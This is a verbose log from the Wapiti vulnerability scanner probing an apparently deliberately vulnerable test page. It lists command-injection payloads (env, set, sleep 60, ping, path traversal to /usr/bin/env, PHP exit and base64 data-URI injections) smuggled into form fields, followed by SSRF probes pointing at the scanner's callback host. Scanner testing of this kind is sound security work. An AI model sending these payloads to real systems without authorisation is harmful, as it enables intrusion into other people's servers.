2024-03-20 16:41:19.405 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
2024-03-20 16:41:27.918 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=set&security_level=2
2024-03-20 16:41:27.924 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=env&security_level=2
2024-03-20 16:41:27.931 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%2Fe%00&security_level=2
2024-03-20 16:41:27.938 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
2024-03-20 16:41:27.944 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
2024-03-20 16:41:27.952 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
2024-03-20 16:41:27.958 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
2024-03-20 16:41:27.966 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
2024-03-20 16:41:27.972 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
2024-03-20 16:41:27.978 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
2024-03-20 16:41:27.986 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
2024-03-20 16:41:27.995 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
2024-03-20 16:41:28.001 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
2024-03-20 16:41:28.009 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
2024-03-20 16:41:28.016 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
2024-03-20 16:41:28.023 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&security_level=2
2024-03-20 16:41:28.030 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=a%60%29%60&security_level=2
2024-03-20 16:41:28.035 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=a%60sleep%2060%60&security_level=2
2024-03-20 16:41:28.042 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=a%3Bsleep%2060%3B&security_level=2
2024-03-20 16:41:28.049 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=a%7Csleep%2060%3B&security_level=2
2024-03-20 16:41:28.055 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%26ping%20-n%2025%20127.0.0.1%26&security_level=2
2024-03-20 16:41:28.064 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%3Benv%3B
2024-03-20 16:41:28.071 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%7Cenv%7C
2024-03-20 16:41:28.077 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=a%3Benv%3B
2024-03-20 16:41:28.083 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=a%3Benv%3B
2024-03-20 16:41:28.090 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
2024-03-20 16:41:28.098 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%3Benv%3B
2024-03-20 16:41:28.104 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%0Aenv%3B
2024-03-20 16:41:28.111 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%26set%26
2024-03-20 16:41:28.118 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=set
2024-03-20 16:41:28.125 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=env
2024-03-20 16:41:28.132 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%2Fe%00
2024-03-20 16:41:28.138 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:41:28.145 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:41:28.153 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:41:28.160 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:41:28.167 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:41:28.174 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:41:28.181 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:41:28.188 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:41:28.195 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:41:28.202 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:41:28.209 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:41:28.217 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:41:28.223 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
2024-03-20 16:41:28.231 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=a%60%29%60
2024-03-20 16:41:28.238 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=a%60sleep%2060%60
2024-03-20 16:41:28.244 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=a%3Bsleep%2060%3B
2024-03-20 16:41:28.251 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=a%7Csleep%2060%3B
2024-03-20 16:41:28.258 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=%26ping%20-n%2025%20127.0.0.1%26
2024-03-20 16:41:28.274 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13
2024-03-20 16:41:28.276 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%3Benv%3B&bug=13
2024-03-20 16:41:28.282 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%7Cenv%7C&bug=13
2024-03-20 16:41:28.288 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=a%3Benv%3B&bug=13
2024-03-20 16:41:28.295 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=a%3Benv%3B&bug=13
2024-03-20 16:41:28.302 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&bug=13
2024-03-20 16:41:28.308 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%3Benv%3B&bug=13
2024-03-20 16:41:28.315 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%0Aenv%3B&bug=13
2024-03-20 16:41:28.321 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%26set%26&bug=13
2024-03-20 16:41:28.327 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=set&bug=13
2024-03-20 16:41:28.334 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=env&bug=13
2024-03-20 16:41:28.341 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%2Fe%00&bug=13
2024-03-20 16:41:28.349 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=13
2024-03-20 16:41:28.355 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=13
2024-03-20 16:41:28.363 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=13
2024-03-20 16:41:28.370 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=13
2024-03-20 16:41:28.376 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=13
2024-03-20 16:41:28.383 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=13
2024-03-20 16:41:28.390 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=13
2024-03-20 16:41:28.398 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=13
2024-03-20 16:41:28.405 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=13
2024-03-20 16:41:28.412 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=13
2024-03-20 16:41:28.419 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=13
2024-03-20 16:41:28.425 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=13
2024-03-20 16:41:28.433 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&bug=13
2024-03-20 16:41:28.441 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=a%60%29%60&bug=13
2024-03-20 16:41:28.448 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=a%60sleep%2060%60&bug=13
2024-03-20 16:41:28.454 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=a%3Bsleep%2060%3B&bug=13
2024-03-20 16:41:28.460 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=a%7Csleep%2060%3B&bug=13
2024-03-20 16:41:28.467 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%26ping%20-n%2025%20127.0.0.1%26&bug=13
2024-03-20 16:41:28.475 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%3Benv%3B
2024-03-20 16:41:28.483 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%7Cenv%7C
2024-03-20 16:41:28.490 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=a%3Benv%3B
2024-03-20 16:41:28.498 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=a%3Benv%3B
2024-03-20 16:41:28.504 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
2024-03-20 16:41:28.511 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%3Benv%3B
2024-03-20 16:41:28.518 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%0Aenv%3B
2024-03-20 16:41:28.525 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%26set%26
2024-03-20 16:41:28.532 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=set
2024-03-20 16:41:28.539 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=env
2024-03-20 16:41:28.546 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%2Fe%00
2024-03-20 16:41:28.553 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:41:28.560 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:41:28.568 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:41:28.574 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:41:28.582 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:41:28.588 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:41:28.597 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:41:28.604 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:41:28.610 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:41:28.618 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:41:28.624 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:41:28.631 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:41:28.637 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
2024-03-20 16:41:28.643 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=a%60%29%60
2024-03-20 16:41:28.651 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=a%60sleep%2060%60
2024-03-20 16:41:28.658 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=a%3Bsleep%2060%3B
2024-03-20 16:41:28.665 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=a%7Csleep%2060%3B
2024-03-20 16:41:28.672 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%26ping%20-n%2025%20127.0.0.1%26
2024-03-20 16:41:28.701 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-20 16:41:28.715 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
2024-03-20 16:41:28.716 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/sqli_1.php?title=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F1%2F7469746c65%2F&action=search (0)
2024-03-20 16:41:28.726 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/sqli_1.php?title=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F1%2F616374696f6e%2F (0)
2024-03-20 16:41:28.743 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=default&action=search (1)
2024-03-20 16:41:28.743 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/sqli_1.php?title=default&action=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F4%2F616374696f6e%2F (1)
2024-03-20 16:41:28.764 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php (1)
2024-03-20 16:41:28.777 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2
2024-03-20 16:41:28.777 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F2%2F666f726d5f73656375726974795f6c6576656c%2F&security_level=2
2024-03-20 16:41:28.789 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F2%2F73656375726974795f6c6576656c%2F
2024-03-20 16:41:28.807 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13
2024-03-20 16:41:28.808 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F3%2F666f726d5f627567%2F&bug=13
2024-03-20 16:41:28.818 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fgtizmc%2F3%2F627567%2F
2024-03-20 16:41:28.849 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=gtizmc for results, please wait...
